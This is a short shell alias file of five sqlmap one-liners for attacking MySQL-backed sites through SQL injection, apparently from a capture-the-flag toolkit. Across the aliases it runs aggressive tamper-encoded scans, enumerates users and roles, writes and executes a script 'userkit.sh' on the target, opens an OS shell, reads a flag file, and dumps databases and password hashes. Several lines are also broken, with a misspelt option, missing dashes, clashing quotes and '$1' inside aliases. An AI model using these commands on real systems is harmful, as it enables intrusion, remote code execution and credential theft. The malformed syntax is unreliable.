alias sqlmapT='sqlmap -r $1 --batch --threads=3 --level=5 --risk=3 --alert='echo -e "\e[1;32mSQL INJECTION FOUND!!!!!....\e[0m"' --flush-session --dbms MYSQL --tamper=charencode.py'
alias sqlmapR="sqlmap $1 --batch --curent-user --roles --threads=3 --level=5 --risk=3 --dbms MYSQL"
alias sqlmapP="sqlmap $1 --batch --file-dest=/tmp/userkit.sh --file-write=userkit.sh os-cmd='bash userkit.sh' --threads=3 --level=5 --risk=3 --dbms MYSQL"
alias sqlmapE="sqlmap $1 --batch --file-read=/opt/flag.txt --os-shell threads=3 --level=5 --risk=3 --dbms MYSQL"
alias sqlmapD="sqlmap $1 --batch --dbs --count --passwords --dump --threads=10 --level=5 --risk=3 --dbms MYSQL"
